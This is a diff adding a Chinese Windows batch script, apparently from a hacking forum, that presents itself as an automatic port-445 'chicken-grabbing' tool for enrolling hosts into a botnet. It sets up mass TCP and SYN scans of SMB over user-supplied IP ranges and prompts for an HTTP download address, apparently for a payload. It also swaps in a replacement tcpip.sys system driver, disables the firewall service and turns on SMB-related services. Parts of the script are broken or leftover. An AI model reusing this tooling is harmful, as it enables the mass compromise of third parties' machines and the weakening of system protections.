@@ -1,0 +1,413 @@
+
+@echo oFF 
+set tcopu=%%bh%%jkq%%vz%%f7%%4c50t%%u1w8%%(cdf9)%%@6tc%% 
+@shift
+@echo off
+cls
+rem 设置默认的控制台前景和背景颜色。
+rem COLOR [attr]
+rem   attr        指定控制台输出的颜色属性
+rem 颜色属性由两个十六进制数字指定 -- 第一个为背景，第二个则为
+rem 前景。每个数字可以为以下任何值之一:
+rem    0 = 黑色       8 = 灰色
+rem    1 = 蓝色       9 = 淡蓝色
+rem    2 = 绿色       A = 淡绿色
+rem    3 = 浅绿色     B = 淡浅绿色
+rem    4 = 红色       C = 淡红色
+rem    5 = 紫色       D = 淡紫色
+rem    6 = 黄色       E = 淡黄色
+rem    7 = 白色       F = 亮白色
+if not exist %windir%\xf.txt ( goto zcmyz ) else ( goto start )
+:zcmyz
+这个是跨区扫描误点.exe
+MODE con COLS=40 LINES=15
+color 0A
+title ☆桃子网络技术论坛☆ 
+for /f "tokens=15" %%i in ('ipconfig ^| find /i "ip address"') do set ip=%%i
+echo. 
+echo.      打开www.ip138.com查看自己IP
+echo.     ╭─────────────╮
+echo.     │                          │
+echo      │    5秒后跳转密码验证     │
+echo.     │                          │
+echo      │    个人意见 抄袭可耻     │
+echo.     │                          │
+echo.     │     www.tzddos.com       │
+echo.     │  ╭─────────╮  │
+echo.     ╰─┤ 桃子网络技术论坛 ├─╯
+echo          ╰─────────╯
+setlocal enabledelayedexpansion
+set a=  ☆★桃子网络技术论坛 ★☆
+set b=
+echo/
+set/p=<nul
+for /l %%a in (1,1,16) do (
+set /a d=%%a*2+5
+call :ML %%a
+)
+ping -n 3 127.1>nul
+goto mmyz
+:ML
+set/p=     !a:~0,%1!<nul&set/p=!b:~0,%d%!<nul
+ping -n 1 127.1>nul
+goto :eof
+:mmyz
+title 密码验证 ☆桃子网络技术论坛☆
+MODE con COLS=40 LINES=15
+@echo off
+setlocal
+cls
+color 0C
+echo.
+echo.           全自动445抓鸡工具
+echo.     ╭─────────────╮
+echo.     │                          │
+echo      │   密码暂时为 ：您的 IP   │
+echo.     │                          │
+echo      │   输入密码（Enter确认）  │
+echo.     │                          │
+echo      │   个人意见   抄袭可耻    │
+echo.     │  ╭─────────╮  │
+echo.     ╰─┤桃子网络技术论坛  ├─╯
+echo          ╰─────────╯
+echo.
+set /p CB=         PassWord：
+IF NOT "%CB%"=="" SET CB=%CB:~0,2%
+if /i "%CB%"=="" goto wangle
+if /i "%CB%"=="www.tzddos.com" ( goto mmbat ) else ( goto wangle )
+:wangle
+title 验证错误 ☆桃子网络技术论坛☆
+@echo off
+setlocal
+cls
+color 0B 
+echo.
+echo.            全自动445抓鸡工具
+echo.      ╭─────────────╮
+echo.      │                          │
+echo       │    请尊重他人劳动成果    │
+echo.      │                          │
+echo       │      您还有两次机会      │
+echo.      │                          │
+echo       │     个人意见抄袭可耻     │
+echo.      │  ╭─────────╮  │
+echo.      ╰─┤桃子网络技术论坛  ├─╯
+echo           ╰─────────╯
+echo.
+SET /P wangle=        PassWord：
+IF /I "%wangle%"=="" ( goto start ) else ( goto erromm )
+:erromm
+@echo off
+setlocal
+cls
+color 09
+echo.
+echo.           全自动445抓鸡工具
+echo.     ╭─────────────╮
+echo.     │                          │
+echo      │哦，忘了告诉你了，刚升级了│
+echo.     │                          │
+echo.     │软件版本，密码是空间的QQ号│
+echo.     │                          │
+echo      │   输入密码（Enter确认）  │
+echo.     │  ╭─────────╮  │
+echo.     ╰─┤桃子网络技术论坛  ├─╯
+echo.         ╰─────────╯
+echo.
+SET /P erromm=        PassWord：
+IF /I "%erromm%"=="" ( goto start ) else ( goto zuihoujh )
+:zuihoujh
+@echo off
+setlocal
+cls
+color 0B
+echo.            全自动445抓鸡工具
+echo.      ╭─────────────╮
+echo       │   哥哥，密码还是不对。   │
+echo.      │                          │
+echo       │   您还有最后一次机会     │
+echo.      │                          │
+echo       │    个人意见抄袭可耻      │
+echo.      │  ╭─────────╮  │
+echo.      ╰─┤桃子网络技术论坛  ├─╯
+echo           ╰─────────╯
+echo.
+echo.        密码：www.tzddos.com 
+echo. 
+SET /P zuihoujh=        PassWord：
+IF /I "%zuihoujh%"=="" ( goto start ) else ( goto laji )
+:laji
+color 3B
+cls
+echo.
+echo.           全自动445抓鸡工具
+echo.   ╭───────────────╮
+echo    │你真够垃圾的，兄弟多日的辛苦，│
+echo.   │                              │
+echo    │你都不支持一下。没告诉你吗？  │
+echo.   │                              │
+echo.   │密码就是论坛地址啊。我靠！！  │
+echo.   │                              │
+echo.   │     真想揍你一顿……         │
+echo.   │    ╭─────────╮    │
+echo.   ╰──┤桃子网络技术论坛  ├──╯
+echo          ╰─────────╯
+echo.
+echo.       ☆★桃子网络技术论坛★☆
+echo.
+setlocal enabledelayedexpansion
+set a=    ⊙⊙⊙⊙ 交流群：111933986 ⊙⊙⊙⊙
+set b=
+set/p=<nul
+for /l %%a in (1,1,22) do (
+set /a d=%%a*2+5
+call :MLq %%a
+)
+start tencent://Message/?Uin=111933986
+ping -n 3 127.1>nul
+del %0
+goto exit
+:MLq
+set/p=     !a:~0,%1!<nul&set/p=!b:~0,%d%!<nul
+ping -n 1 127.1>nul
+goto :eof
+:start
+这个是跨区扫描误点.exe
+title 全自动445抓鸡工具 桃子网络技术论坛
+MODE con COLS=56 LINES=28
+@echo off
+setlocal
+cls
+color D
+echo.
+echo     Hello: %username%! Today is %date% 
+echo.
+echo          您的计算机名是：%COMPUTERNAME%!
+echo.
+:P50-2000
+ver|find "5.0" >nul
+if %errorlevel% EQU 0 (echo          您的操作系统是： Windows 2000 &echo.………………………………………………………………………) else goto P51-XP
+goto starto
+:P51-XP
+ver|find "5.1" >nul
+if %errorlevel% EQU 0 (echo          您的操作系统是： Windows XP &echo.………………………………………………………………………) else goto P52-2003
+goto starto
+:P52-2003
+ver|find "5.2" >nul
+if %errorlevel% EQU 0 (echo          您的操作系统是： Windows Server 2003 &echo.………………………………………………………………………) else goto P60-VISTA
+goto starto
+:P60-VISTA
+ver|find "6.0" >nul
+if %errorlevel% EQU 0 (echo    Oh! My God! 您的操作系统是： Windows Vista! &echo.………………………………………………………………………) else (echo                       不能检测您的系统版本 &VER)
+:starto
+echo.     ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗
+echo.     ┋        ╭───────────╮        ┋
+echo.     ┋┌───┤  全自动445抓鸡工具   ├───┐┋
+echo.     ┋│      ╰───────────╯      │┋
+echo.     ┋├─────┬─────┬───────┤┋
+echo.     ┋│     A.WINDOWS XP TCP 多线程扫描      │┋
+echo.     ┋├─────┼─────┼───────┤┋
+echo.     ┋│     B.WINDOWS 2000 2003 SYN扫描      │┋
+echo.     ┋├─────┴───┬─┴───────┤┋
+echo.     ┋│     C.开始扫描前必需要开启以下服务   │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋│     D.使XP系统突破SYN系统扫描        │┋
+echo.     ┋├─────┴───┬─┴───────┤┋
+echo.     ┋│     桃子网络技术论坛:111933986       │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋│              E.退出程序              │┋
+echo.     ┋└───────────────────┘┋
+echo.     ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝
+echo.………………………………………………………………………
+:CHO
+set choice1=
+set /p choice1=请选择以上服务（Enter确认）:
+IF NOT "%Choice1%"=="" SET Choice=%Choice:~0,1%
+if /i "%choice1%"=="A" goto TCP
+if /i "%choice1%"=="B" goto SYN
+if /i "%choice1%"=="C" goto yyy
+if /i "%choice1%"=="D" goto SAO
+if /i "%choice1%"=="E" goto end 
+echo 输入错误，请重新输入
+goto CHO
+:SAO
+这个是跨区扫描误点.exe
+echo.………………………………………………………………………
+title 全自动445抓鸡工具 桃子网络技术论坛--突破SYN
+MODE con COLS=56 LINES=28
+@echo off
+setlocal
+cls
+@echo off
+color 0a
+ren %systemroot%\system32\dllcache\tcpip.sys tcpip.sys.bak
+ren %systemroot%\system32\drivers\tcpip.sys tcpip.sys.bak
+copy tcpip.sys %systemroot%\system32\drivers\tcpip.sys > nul
+sc config sharedaccess start= demand > nul
+del /f tcpip.sys
+echo 您的XP系统在重启后将会支持SYN扫描方式！
+echo 请按任意键退出程序！
+echo.     ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗
+echo.     ┋        ╭───────────╮        ┋
+echo.     ┋┌───┤  全自动445抓鸡工具   ├───┐┋
+echo.     ┋│      ╰───────────╯      │┋
+echo.     ┋├─────┬─────┬───────┤┋
+echo.     ┋│ A.重启电脑   B.返回菜单   C.退出程序 │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋└───────────────────┘┋
+echo.     ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝
+echo.………………………………………………………………………
+set choice6=
+set /p choice6=请选择以上服务（Enter确认）:
+IF NOT "%Choice6%"=="" SET Choice=%Choice:~0,1%
+if /i "%choice6%"=="A" goto cqd
+if /i "%choice6%"=="B" goto start
+if /i "%choice6%"=="C" goto end
+echo 输入错误，请重新输入
+goto CHO
+:cqd
+shutdown -r -t 0
+:TCP
+title 全自动445抓鸡工具 桃子网络技术论坛--TCP扫描
+MODE con COLS=56 LINES=28
+@echo off
+setlocal
+cls
+echo.………………………………………………………………………
+echo 请将纯真IP数据段填写进IP.txt!^^_^^ 
+echo.………………………………………………………………………
+echo 输入完IP后，按任意键开始扫描... >IP.txt
+IP.txt
+set /p http=请输入Http下载地址:
+echo @echo off >1.tzddos
+FOR /F "eol=; tokens=1,2 delims= " %%i in (IP.txt) do @echo cls^&s TCP %%i %%j 445 /save 1000>%%i.bat&copy %%i.bat+tzddos %%j.tzddos&del %%i.bat
+copy *.tzddos scan.bat&del *.tzddos
+copy opung.dll IP.txt
+call scan.bat
+del ips.txt
+echo.     ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗
+echo.     ┋        ╭───────────╮        ┋
+echo.     ┋┌───┤   全自动445抓鸡工具  ├───┐┋
+echo.     ┋│      ╰───────────╯      │┋
+echo.     ┋├─────┬─────┬───────┤┋
+echo.     ┋│ A.重新输入   B.返回菜单   C.退出程序 │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋└───────────────────┘┋
+echo.     ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝
+:TCP1
+set choice2=
+set /p choice2=请输入:
+if not "%Choice2%"=="" set Choice=%Choice:~0,1%
+if /i "%choice2%"=="A" goto TCP
+if /i "%choice2%"=="C" goto end
+if /i "%choice2%"=="B" goto start
+echo 输入错误，请重新输入
+goto TCP1
+:SYN
+title 全自动445抓鸡工具 桃子网络技术论坛--SYN扫描
+MODE con COLS=56 LINES=28
+@echo off
+color 0c
+setlocal
+cls
+echo.………………………………………………………………………
+echo 请将纯真IP数据段填写进IP.txt!^^_^^ 
+echo.………………………………………………………………………
+echo 输入完IP后，按任意键开始扫描... >IP.txt
+IP.txt
+set /p http=请输入Http下载地址:
+echo @echo off >1.tzddos
+FOR /F "eol=; tokens=1,2 delims= " %%i in (IP.txt) do @echo cls^&s syn %%i %%j 445 /save >%%i.bat&copy %%i.bat+tzddos %%j.tzddos&del %%i.bat
+copy *.tzddos scan.bat&del *.tzddos
+copy opung.dll IP.txt
+call scan.bat
+del ips.txt
+echo.     ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗
+echo.     ┋        ╭───────────╮        ┋
+echo.     ┋┌───┤   全自动445抓鸡工具  ├───┐┋
+echo.     ┋│      ╰───────────╯      │┋
+echo.     ┋├─────┬─────┬───────┤┋
+echo.     ┋│ A.重新输入   B.返回菜单   C.退出程序 │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋└───────────────────┘┋
+echo.     ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝
+:SYN1
+set choice3=
+set /p choice3=请输入:
+if not "%Choice3%"=="" set Choice=%Choice:~0,1%
+if /i "%choice3%"=="A" goto SYN
+if /i "%choice3%"=="C" goto end
+if /i "%choice3%"=="B" goto start
+echo 输入错误，请重新输入
+goto SYN1
+:yyy
+echo.………………………………………………………………………
+title 全自动445抓鸡工具 桃子网络技术论坛 开启服务
+MODE con COLS=56 LINES=28
+@echo off
+setlocal
+cls
+color B
+echo.
+echo 开始扫描前需要检测并开启以下服务,请稍等....
+echo.
+sc config LmHosts start= auto
+sc config RpcLocator start= auto
+sc config NtlmSsp start= auto
+sc config lanmanserver start= auto
+sc config SharedAccess start= disabled
+net start LmHosts 2>nul
+net start RpcLocator 2>nul
+net start NtlmSsp 2>nul
+net start lanmanserver 2>nul
+net stop SharedAccess >nul 2>nul
+echo.
+echo 开启需要的服务成功完毕!
+echo.     ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗
+echo.     ┋        ╭───────────╮        ┋
+echo.     ┋┌───┤   全自动445抓鸡工具  ├───┐┋
+echo.     ┋│      ╰───────────╯      │┋
+echo.     ┋├──────┬─────┬──────┤┋
+echo.     ┋│ A.返回菜单   桃子网络   B.退出程序   │┋
+echo.     ┋├─────────┴─────────┤┋
+echo.     ┋└───────────────────┘┋
+echo.     ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝
+set choice4=
+set /p choice4=请输入:
+if not "%Choice4%"=="" set Choice=%Choice:~0,1%
+if /i "%choice4%"=="B" goto end
+if /i "%choice4%"=="A" goto start
+echo 输入错误，请重新输入
+echo.………………………………………………………………………
+:end
+end
+mode con cols=45 lines=18
+title 感谢您的使用，再见。
+color 4f
+echo ---------------------------------------------   “非常感谢您的使用，愿您工作愉快”  “有什么问题请论坛留言。再见！！！”     欢迎光临桃子网络技术论坛  http://www.tzddos.com/ -------------------------------------------->byebye.txt
+set stroob=0
+for /f "delims=" %%x in (endend.txt) do call :lisoob %%x
+:zoule
+del endend.txt
+goto exit
+:lisoob
+set varoob=%*
+:loopoob
+call set num=%%varoob:~%stroob%,1%%
+if "%num%"=="" set stroob=0&goto zoule 
+if "%num%"==" " (echo\) else set /p x=%num%<nul
+set/a stroob+=1
+goto loopoob
+:exit
+exit
+:Assoc 
+::对%1(第一个参数）进行分割，将第二个参数传给%%e。在本程序中，%1即为上面的%%i(形式为：IP:端口号) 
+for /F "tokens=2 delims=:" %%e in ("%1") do ( 
+set  %2_Port=%%e 
+) 
+:: 查询PID等于%3(第三个参数)的进程，并将结果传给变量?_Proc_Name,?代表UDP或者TCP； 
+for /F "skip=2 usebackq delims=, tokens=1" %%a in (`"Tasklist /FI "PID eq %3" /FO CSV"`) do ( 
+::%%~a表示去掉%%a外面的引号，因为上述命令的结果是用括号括起来的。  
+set %2_Proc_Name=%%~a 
+) 
+echo.………………………………………………………………………
